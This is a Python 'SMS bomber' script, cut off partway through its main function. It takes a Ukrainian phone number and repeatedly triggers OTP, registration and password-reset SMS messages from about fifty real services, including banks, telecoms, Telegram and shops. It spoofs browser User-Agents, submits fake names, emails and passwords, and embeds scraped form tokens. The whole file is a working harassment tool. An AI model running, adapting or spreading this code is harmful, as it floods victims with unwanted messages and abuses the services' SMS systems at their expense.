# CREATOR 
# NAME: Vladislav 
# SURNAME: Khudash  
# AGE: 16

# DATE: 27.07.2025
# APP: UKRAINIAN_SMS_BOMBER
# TYPE: SMS_BOMBER
# VERSION: LATEST
# PLATFORM: ANY


from requests import get, post, ConnectionError
from os import abort, system as shell
from time import sleep, ctime
from random import choice
from sys import platform 


HEADERS = choice([{'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:50.0.1) Gecko/20100101 Firefox/50.0.1'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.7.4) Gecko/20100101 Firefox/52.7.4'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6; rv:58.0.2) Gecko/20100101 Firefox/58.0.2'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Safari/537.36 OPR/55.0.2994.61'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0.2) Gecko/20100101 Firefox/56.0.2'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Safari/537.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.81 Safari/537.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; rv:57.0.3) Gecko/20100101 Firefox/57.0.3'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2; rv:52.8.1) Gecko/20100101 Firefox/52.8.1'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6; rv:60.2.2) Gecko/20100101 Firefox/60.2.2'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.75 Safari/537.36 OPR/54.0.2952.64'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (X11; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.79 Safari/537.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.158 Safari/537.36 OPR/52.0.2871.99'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (X11; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Safari/537.36 OPR/50.0.2762.67'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36 OPR/55.0.2994.37'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626 Safari/537.36 OPR/56.0.3051.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.81 Safari/537.36 OPR/55.0.2994.47'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:66.0.3) Gecko/20100101 Firefox/66.0.3'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1; rv:52.5.2) Gecko/20100101 Firefox/52.5.2'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0.2) Gecko/20100101 Firefox/59.0.2'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (X11; Linux i686; rv:52.1.1) Gecko/20100101 Firefox/52.1.1'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6; rv:59.0.2) Gecko/20100101 Firefox/59.0.2'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6; rv:58.0.2) Gecko/20100101 Firefox/58.0.2'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:57.0.2) Gecko/20100101 Firefox/57.0.2'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2; rv:52.1.0) Gecko/20100101 Firefox/52.1.0'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1; rv:66.0.5) Gecko/20100101 Firefox/66.0.5'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6; rv:62.0.2) Gecko/20100101 Firefox/62.0.2'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:60.3.0) Gecko/20100101 Firefox/60.3.0'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.170 Safari/537.36 OPR/52.0.2871.64'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809 Safari/537.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (X11; Linux i686; rv:59.0.2) Gecko/20100101 Firefox/59.0.2'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809 Safari/537.36 OPR/58.0.3135.107'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36 OPR/54.0.2952.64'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:51.0.1) Gecko/20100101 Firefox/51.0.1'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_1; rv:52.8.1) Gecko/20100101 Firefox/52.8.1'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6; rv:50.0.2) Gecko/20100101 Firefox/50.0.2'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0 Safari/537.36 OPR/58.0.3135.127'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6; rv:65.0.1) Gecko/20100101 Firefox/65.0.1'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.170 Safari/537.36 OPR/52.0.2871.64'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.5.2) Gecko/20100101 Firefox/60.5.2'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.109 Safari/537.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (X11; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36 OPR/56.0.3051.52'}])

_how_many_messages_sent, _how_many_messages_were_not_sent, _check_internet_connection = 0, 0, 0


def get_time():
    return ctime().split()[3]


def sms_bomber_to_this_phone_number(target_phone_number, _globals=globals()):


    def _if_internet(mode=0, name=None):
        try: 
            get(url='https://www.google.com', headers=HEADERS, timeout=10)
        except: 
            if mode != 1 and name is None :
                raise ConnectionError 
            else: 
                _output_result_attack(mode=1)


    def _start_sms_bomber_to_this_phone_number(name, url, data=None, json=None): 
        global _how_many_messages_sent, _how_many_messages_were_not_sent, _check_internet_connection

        try: 
            sleep(5) 

            if data is None or json is None:
                get(
                    url=url, 
                    headers=HEADERS, 
                    timeout=10
                ) 
            else: 
                post(
                    url=url, 
                    data=data if not data is None else None, 
                    json=json if not json is None else None, 
                    headers=HEADERS, 
                    timeout=10
                )
        except ConnectionError:
            _check_internet_connection += 1

            if name == 'oschadbank.ua' and _check_internet_connection == 0:
                _if_internet() 
            else: 
                _if_internet(mode=1, name=name)
        except KeyboardInterrupt:
            _output_result_attack() 
        except: 
            print(f'[{get_time()}] {name} --> {target_phone_number} [-]')
            _how_many_messages_were_not_sent += 1
        else: 
            print(f'[{get_time()}] {name} --> {target_phone_number} [+]')   
            _how_many_messages_sent += 1
    
    
    def _output_result_attack(mode=0):
        print(
            f'\n {"-":-^{_len_how_many_messages_have_not_been_sent - 3 if int(_len_how_many_messages_have_not_been_sent := (len(_string_how_many_messages_have_not_been_sent := f"|How many messages have not been sent: {_how_many_messages_were_not_sent}"))
            ) > int(_len_string_how_many_messages_sent := len(_string_how_many_messages_sent := f"|How many messages have been sent:     {_how_many_messages_sent}")
            ) else _len_string_how_many_messages_sent - 1}}\n{_string_how_many_messages_sent}{"":<{_integer_1 - _integer_2 if int(_integer_1 := len(_string_how_many_messages_have_not_been_sent.split()[-1])
            ) > int(_integer_2 := len(_string_how_many_messages_sent.split()[-1])) else 0}}|\n{_string_how_many_messages_have_not_been_sent}{"":<{_integer_2 - _integer_1 if _integer_2 > _integer_1 else 0}}|\n {"-":-^{_len_how_many_messages_have_not_been_sent - 3 if _len_how_many_messages_have_not_been_sent > _len_string_how_many_messages_sent else _len_string_how_many_messages_sent - 1}}\n'
        ) 
        
        raise ConnectionError if mode != 0 else StopIteration
    
    
    target_phone_number_slice_1 = target_phone_number[1:]
    target_phone_number_slice_2_with_the_figure_breckets = f'{target_phone_number[0:4]}({target_phone_number[4:6]}){target_phone_number[6:9]}-{target_phone_number[9:11]}-{target_phone_number[11:13]}'
   
    while True: 
        exec("for service in [{'name': 'oschadbank.ua', 'url': f'https://c2c.oschadbank.ua/api/sms/{target_phone_number_slice_1}'}, {'name': 'kyivstar.ua', 'url': 'https://account.kyivstar.ua/cas/new/api/otp/send?locale=uk', 'json': {'action': 'registration', 'captcha': None, 'login': target_phone_number_slice_1}}, {'name': 'germes.one', 'url': 'https://germes.one/ajax/registration/', 'data': {'userFirstName': str(name := choice(['Владислав', 'Артур', 'Саша', 'Ваня', 'Валера', 'Анастасия', 'Петя', 'Лера', 'Гоша', 'Виталик', 'Женя', 'Жора', 'Максим', 'Дмитрий', 'Витя', 'Лёша', 'Серёжа', 'Лиза', 'Инеса', 'Даша', 'Андрей', 'Борис', 'Артем', 'Лариса', 'Аня', 'Матвей', 'Варя'])), 'userTel': target_phone_number, 'userEmail': str(email := choice(['top123good@gmail.com', 'noob123god@gmail.com', 'tamara123@gmail.com', 'artur123@gmail.com', 'alina123@gmail.com', 'top123top123@gmail.com', 'goodtop@gmail.com', 'goodtop1@gmail.com', 'goodtop12@gmail.com', 'lalala@gmail.com', 'lalalala@gmail.com', 'lalalala123@gmail.com', 'sniperworld@gmail.com', 'gamaandgame@gmail.com', 'onetwothree@gmail.com', 'android@gmail.com'])), 'userPassword': str(password := choice(['V1230987good', 'GoodHello123', 'GoodBye0987', 'How12345086', 'StopigNo567107', 'YouDummy10', '123098hgS', 'dfdidHjkKlksS2323', '123Abs321abS', 'YouNowOh126877', '666Now666', '345Fodigcv', 'PleaseRegisternow1', 'DrinkNow4556', 'vvvSeX123vvv', 'pAsSwORd123', 'passworD0987', 'dog13232Dg', 'Cat2dcSdV', 'VdogaVdcat123V', 'Peta123peta0987', 'VPiska123', 'piska123V', 'V123Vgood', 'Nice1to2meet', 'S1mplE'])), 'userConfirmPassword': password}}, {'name': 'vizitka.ua', 'url': 'https://vizitka.ua/pages/fns/index.php', 'data': {'action': 'customerRegister', 'phone': f'{target_phone_number[0:3]} ({target_phone_number[3:6]}) {target_phone_number[6:9]}-{target_phone_number[9:11]}-{target_phone_number[11:13]}'}}, {'name': 'pidbir.com', 'url': 'https://pidbir.com/lib/ajax.php', 'data': {'command': 'auth', 'phone': target_phone_number, 'employer': '0'}}, {'name': 'creditkasa.ua', 'url': 'https://api.creditkasa.ua/public/auth/sendAcceptanceCode', 'json': {'brandName': 'NaVse', 'mobilePhone': target_phone_number_slice_1, 'productGroup': 'INSTALLMENT'}}, {'name': 'ctrs.com.ua', 'url': 'https://my.ctrs.com.ua/api/auth/login', 'data': {'_token': 'C7xZ8x0Zk8gwbCVSCcOxPo4Wd0LtEbMTS7SKka6u', 'identity': target_phone_number}}, {'name': 'pizza.od.ua', 'url': 'https://pizza.od.ua/ajax/reg.php', 'data': {'james': 'bond', 'phone': f'{target_phone_number[0:3]}({target_phone_number[3:6]}){target_phone_number[6:9]}-{target_phone_number[9:11]}-{target_phone_number[11:13]}'}}, {'name': 'stylus.ua', 'url': 'https://gateway.prod.stylusapp.click/auth/register', 'json': {'phone': target_phone_number, 'email': email, 'first_name': name, 'last_name': str(surname := choice(['Худаш', 'Кузняков', 'Лех', 'Ромасенко', 'Мусиченко', 'Попов', 'Лебядив', 'Губенко', 'Василевич', 'Иванов', 'Смирнов', 'Петров', 'Соколов', 'Михайлов', 'Крылов', 'Зайцев', 'Морозов', 'Павлов', 'Осипов', 'Козлов', 'Фролов', 'Белоусов', 'Цветков', 'Антонов', 'Плахотин', 'Кузьмин', 'Колесников']))}}, {'name': 'telegram.org', 'url': 'https://my.telegram.org/auth/send_password', 'data': {'phone': target_phone_number}}, {'name': 'megasport.ua', 'url': 'https://megasport.ua/api/auth/phone/?auth=web_client_2&language=ua', 'json': {'phone': target_phone_number}}, {'name': 'bi.ua', 'url': 'https://bi.ua/api/v1/accounts', 'json': {'grand_type': 'call_code', 'login': name, 'phone': target_phone_number_slice_1, 'stage': '1'}}, {'name': 'money4you.ua', 'url': 'https://money4you.ua/api/clientRegistration/sendValidationSms', 'json': {'fathersName': str(father_name := choice(['Николаевич', 'Николаевна', 'Владимирович', 'Владимировна', 'Александрович', 'Александрова', 'Иванович', 'Ивановна', 'Васильевич', 'Васильевна', 'Сергеевич', 'Сергеевна', 'Викторович', 'Викторовна', 'Михайлович', 'Михайловна', 'Владленович', 'Денисовна', 'Владиславович', 'Иосифовна', 'Ильич', 'Владиславовна', 'Леонидович', 'Львовна', 'Гаврилович', 'Влантиновна'])), 'firstName': name, 'lastName': surname, 'phone': target_phone_number, 'udriveEmployee': False}}, {'name': 'chicco.com.ua', 'url': 'https://chicco.com.ua/api/user/public/register/phone', 'json': {'firstName': name, 'language': 'ua', 'phone': target_phone_number_slice_1, 'pregnancyDueDate': None, 'project': 'chicco'}}, {'name': 'smaki-maki.com', 'url': 'https://smaki-maki.com/wp-admin/admin-ajax.php', 'data': {'phone': f'{target_phone_number[0:3]} ({target_phone_number[3:6]}) {target_phone_number[6:9]} {target_phone_number[9:11]} {target_phone_number[11:13]}', 'password': password, 'password2': password, 'code': '', 'action': 'register_user_new', 'nonce_code': '24432a728f'}}, {'name': 'finsfera.ua', 'url': 'https://api.finsfera.ua/client', 'json': {'operationName': 'SendCode', 'query': 'mutation SendCode($phone: String!, $channel: smsChannel) {  sendCode(phone: $phone, channel: $channel) {    ... on SendCode {      message      __typename    }    ... on Error {      warnings {        warning        key        __typename      }      error      __typename    }    __typename  }}', 'variables': {'channel': 'SMS', 'phone': f'{target_phone_number[0:4]} ({target_phone_number[4:6]}) {target_phone_number[6:9]} {target_phone_number[9:11]} {target_phone_number[11:13]}'}}}, {'name': 'varus.ua', 'url': 'https://varus.ua/api/ext/uas/auth/send-otp?storeCode=ru', 'json': {'phone': target_phone_number}}, {'name': 'multiplex.ua', 'url': 'https://auth2.multiplex.ua/login', 'json': {'login': target_phone_number_slice_1}}, {'name': 'rieltor.ua', 'url': 'https://rieltor.ua/api/users/register-sms/', 'data': {'phone': target_phone_number_slice_1, 'recaptcha': '03AFcWeA7GshlcHxhT0J9z81Vlr1T-BJOqdFslof-GW2keTnqOT7A-IZ81IweJ7NsLNrUif4NX9mzDXbQ5VuHNOlUEiWKSoLioSmR5RHUVaMz_cTr2TP8lmqAA2k1VpD5yFAYfjuzUfTOKrvUgKfyfPvMk_8auUf6di4dwFvqjX6Mjh-fj72rv3CRJX4jWi3Lr7xipTtFiGIhdWcyvd0Z2L8DirypKCqhMplcQSdLLoCGHPC3LYbqwVAOPrVrvegBFrkM3i5P3fCJojdWxmh2vNhZbjucGTo0p_OPWktCeliZD-JYbpi-08Y9IzglglMXF4fKsmIueYqczKdkGxX7Prjes8Oq9gl8d7pMo1HtYfOZK58UDHZv87S_NnzeheYKmKIr00mH5453_wcuxtBN3TH_yQI6Q-IJdWy8-PejHqwKPfk9y2L8YM3ROUZ_e84Q95gNJLUOQE2XVtO_vzFnfZujv79U6Vb6ZJHA9IxAJ04_ozxaNcd6bpo16KK6j5rfK4ltOg9k_gpq-qlPJiqDbgSL60BdTSNLDyyefRvtFgAGp2e7qqbNlJB52v9bxV4Xtv5m_BPqKM2l3NvcuE99zgvJykUEevPSEyJx8FMFzB1ruStysBWZUxqIstJW6k0DMBlP91KnoRmd7qlI2YUpUjpy47jKjoYlLFJx3K_VJ9o95kFkq4UunzTg', 'retry': 0}}, {'name': 'podorozhnyk.com', 'url': 'https://ucb.l.podorozhnyk.com/api/send/otp', 'json': {'phone': target_phone_number_slice_1}}, {'name': 'help24.org.ua', 'url': 'https://help24.org.ua/api/v1/phone-validation', 'json': {'phone': target_phone_number}}, {'name': 'helsi.me', 'url': 'https://helsi.me/api/healthy/v2/accounts/login', 'json': {'phone': target_phone_number_slice_1, 'platform': 'PISWeb'}}, {'name': 'galafarm.com.ua', 'url': 'https://galafarm.com.ua/api/auth/register', 'json': {'locale': 'uk', 'name': name, 'password': password, 'password_confirmation': password, 'phone': f'{target_phone_number[:3]} ({target_phone_number[3:6]}) {target_phone_number[6:9]}-{target_phone_number[9:11]}-{target_phone_number[11:13]}', 'surname': surname}}, {'name': 'credit7.ua', 'url': 'https://credit7.ua/client/registration/general-information', 'data': {'customer_profile_id': '', 'mobile_phone': f'({target_phone_number[3:6]})+{target_phone_number[6:9]}+{target_phone_number[9:11]}+{target_phone_number[11:13]}', 'date_of_birth': choice(['11.11.2001', '10.10.2000', '19.11.1999', '20.10.2002', '12.12.2002'])}}, {'name': 'prostor.ua', 'url': 'https://prostor.ua/ua/rest/V1/customer/send-otp/', 'json': {'phoneNumber': target_phone_number_slice_1}}, {'name': 'germes.one', 'url': 'https://germes.one/ajax/authorization/', 'data': {'userTelEmail': target_phone_number}}, {'name': 'kvytok.co', 'url': 'https://xn--90aiim0b.com.ua/loginsms.php', 'data': {'phone': target_phone_number, 'sms': '', 'act': 'sendpassword'}}, {'name': 'www.tarantino-family.com', 'url': 'https://www.tarantino-family.com/wp-admin/admin-ajax.php', 'data': {'action': 'ajax_register_user', 'step': 1, 'phone': target_phone_number_slice_1, 'smscode': '', 'security_login': '832eeb7862'}}, {'name': 'gepur.com', 'url': 'https://gepur.com/rapi/auth/register-retail-buyer', 'json': {'email': email, 'firstName': name, 'lastName': surname, 'password': password, 'phone': target_phone_number}}, {'name': 'ilmolino.ua', 'url': 'https://ilmolino.ua/api/v1/user/auth', 'data': {'phone': target_phone_number[4:], 'need_skeep': ''}}, {'name': 'creditkasa.ua', 'url': 'https://api.creditkasa.ua/public/auth/sendAcceptanceCode', 'json': {'mobilePhone': target_phone_number_slice_1, 'productGroup': 'PDL', 'brandName': 'CreditKasa'}}, {'name': 'avrora.ua', 'url': 'https://avrora.ua/index.php?dispatch=otp.send', 'json': {'phone': target_phone_number_slice_2_with_the_figure_breckets, 'security_hash': 'e12440eaedeb21d6faad4721f673325f', 'is_ajax': '1'}}, {'name': 'pavluks-trans.com', 'url': 'https://admin.pavluks-trans.com/api/auth/v2/register', 'json': {'email': email, 'getNews': False, 'name': name, 'password': password, 'phone': target_phone_number_slice_1}}, {'name': 'www.tavriav.ua', 'url': 'https://www.tavriav.ua/send-email', 'data': {'username': target_phone_number_slice_1, 'phone': 'phone'}}, {'name': 'kitchen-profi.com.ua', 'url': 'https://kitchen-profi.com.ua/index.php?route=account/otp/send', 'json': {'telephone': f'{target_phone_number[0:3]}({target_phone_number[3:6]}){target_phone_number[6:9]}-{target_phone_number[9:11]}-{target_phone_number[11:13]}'}}, {'name': 'tehnomarket.ua', 'url': 'https://tehnomarket.ua/handler_ajax.php', 'data': {'action': 'register', 'data[action]': 'register', 'data[fname]': name, 'data[lname]': surname, 'data[login]': target_phone_number, 'data[password]': password}}, {'name': 'sex-shop-g.com.ua', 'url': 'https://sex-shop-g.com.ua/index.php?route=extension/module/sms_reg/SmsCheck', 'data': {'phone': f'{target_phone_number[0:3]}({target_phone_number[3:6]})+{target_phone_number[6:9]}-{target_phone_number[9:11]}-{target_phone_number[11:13]}'}}, {'name': 'eleyus.com', 'url': 'https://eleyus.com/api/v1/auth/registration/', 'json': {'emailPhone': target_phone_number, 'firstName': name, 'lastName': surname, 'newEmailPhone': '', 'password': password}}, {'name': 'prosto.net', 'url': f'https://api.prosto.net/v2/verify?type=intl_phone&value=%{target_phone_number_slice_1}'}, {'name': 'maslotom.com', 'url': 'https://maslotom.com/api/index.php?route=api/account/phoneLogin', 'data': {'phone': f'{target_phone_number[:4]}({target_phone_number[4:6]}){target_phone_number[6:9]}-{target_phone_number[9:11]}-{target_phone_number[11:13]}'}}, {'name': 'shop.kyivstar.ua', 'url': f'https://shop.kyivstar.ua/api/v2/otp_login/send/{target_phone_number[3:]}'}, {'name': 'autoplus.ua', 'url': 'https://autoplus.ua/users/sendcode', 'json': {'counter': 0, 'phone': f'({target_phone_number[3:6]}) {target_phone_number[6:9]}-{target_phone_number[9:11]}-{target_phone_number[11:13]}', 'source': 'auth'}}, {'name': 'vivat.com.ua', 'url': f'https://vivat.com.ua/phone_auth/request/{target_phone_number_slice_1}?lang=uk'}, {'name': 'creditkasa.ua', 'url': 'https://api.creditkasa.ua/public/auth/sendAcceptanceCode', 'json': {'brandName': 'CreditKasa', 'mobilePhone': target_phone_number_slice_1, 'productGroup': 'PDL'}}, {'name': 'holdyou.net', 'url': 'https://holdyou.net/api/users/forgot-password', 'json': {'username': target_phone_number_slice_1}}, {'name': 'pizza.od.ua', 'url': 'https://pizza.od.ua/ajax/forgot.php', 'data': {'james': 'bond', 'phone': f'{target_phone_number[0:3]}({target_phone_number[3:6]}){target_phone_number[6:9]}-{target_phone_number[9:11]}-{target_phone_number[11:13]}', 'login': ''}}, {'name': 'vizitka.ua', 'url': 'https://vizitka.ua/pages/fns/index.php', 'data': {'action': 'forg_pass_verify', 'subAction': 'forgotPass', 'phone': f'{target_phone_number[0:3]} ({target_phone_number[3:6]}) {target_phone_number[6:9]}-{target_phone_number[9:11]}-{target_phone_number[11:13]}'}}, {'name': 'pidbir.com', 'url': 'https://pidbir.com/lib/ajax.php', 'data': {'command': 'auth', 'phone': target_phone_number, 'employer': '1'}}]:\n\tname, email, password, surname, father_name = choice(['Владислав', 'Артур', 'Саша', 'Ваня', 'Валера', 'Анастасия', 'Петя', 'Лера', 'Гоша', 'Виталик', 'Женя', 'Жора', 'Максим', 'Дмитрий', 'Витя', 'Лёша', 'Серёжа', 'Лиза', 'Инеса', 'Даша', 'Андрей', 'Борис', 'Артем', 'Лариса', 'Аня', 'Матвей', 'Варя']), choice(['top123good@gmail.com', 'noob123god@gmail.com', 'tamara123@gmail.com', 'artur123@gmail.com', 'alina123@gmail.com', 'top123top123@gmail.com', 'goodtop@gmail.com', 'goodtop1@gmail.com', 'goodtop12@gmail.com', 'lalala@gmail.com', 'lalalala@gmail.com', 'lalalala123@gmail.com', 'sniperworld@gmail.com', 'gamaandgame@gmail.com', 'onetwothree@gmail.com', 'android@gmail.com']), choice(['V1230987good', 'GoodHello123', 'GoodBye0987', 'How12345086', 'StopigNo567107', 'YouDummy10', '123098hgS', 'dfdidHjkKlksS2323', '123Abs321abS', 'YouNowOh126877', '666Now666', '345Fodigcv', 'PleaseRegisternow1', 'DrinkNow4556', 'vvvSeX123vvv', 'pAsSwORd123', 'passworD0987', 'dog13232Dg', 'Cat2dcSdV', 'VdogaVdcat123V', 'Peta123peta0987', 'VPiska123', 'piska123V', 'V123Vgood', 'Nice1to2meet', 'S1mplE']), choice(['Худаш', 'Кузняков', 'Лех', 'Ромасенко', 'Мусиченко', 'Попов', 'Лебядив', 'Губенко', 'Василевич', 'Иванов', 'Смирнов', 'Петров', 'Соколов', 'Михайлов', 'Крылов', 'Зайцев', 'Морозов', 'Павлов', 'Осипов', 'Козлов', 'Фролов', 'Белоусов', 'Цветков', 'Антонов', 'Плахотин', 'Кузьмин', 'Колесников']), choice(['Николаевич', 'Николаевна', 'Владимирович', 'Владимировна', 'Александрович', 'Александрова', 'Иванович', 'Ивановна', 'Васильевич', 'Васильевна', 'Сергеевич', 'Сергеевна', 'Викторович', 'Викторовна', 'Михайлович', 'Михайловна', 'Владленович', 'Денисовна', 'Владиславович', 'Иосифовна', 'Ильич', 'Владиславовна', 'Леонидович', 'Львовна', 'Гаврилович', 'Влантиновна'])\n\t_start_sms_bomber_to_this_phone_number(**service)",  _globals, locals())


def main():
    global _how_many_messages_sent, _how_many_messages_were_not_sent, _check_internet_connection 

    while True: 
        try: 
            match input('Enter phone number --> '):
                case 'help':
                    print(f'|{"=":-^23}|\n Phone number\n help - Help menu\n clear - Clear output\n exit - Exit the program\n|{"=":-^23}|')
                case 'clear': 
                    shell('cls') if platform == 'win32' else shell('clear')
                case 'exit': 
                    abort()
                case victim_phone_number: 
                    phone_number = ''.join(victim_phone_number.split())
                    phone_number_slice_0 = True if phone_number[0] == '0' else False
                    phone_number_slice_3 = True if phone_number[:3] == '380' else False
                    phone_number_slice_4 = True if phone_number[:4] == '+380' else False
                    phone_number_slice_digit = True if phone_number[0] != '0' else False
                    if (
                    phone_number_slice_4 and phone_number[4] != '0' 
                    or phone_number_slice_3 and phone_number[0] != '0' 
                    or phone_number_slice_0 and phone_number[1] != '0' 
                    or phone_number_slice_digit and phone_number[0] != '0'
                    ) and (
                        phone_number_slice_4 and len(phone_number) == 13 
                        or phone_number_slice_3 and len(phone_number) == 12 
                        or phone_number_slice_0 and len(phone_number) == 10 
                        or phone_number_slice_digit and len(phone_number) == 9
                    ) and (
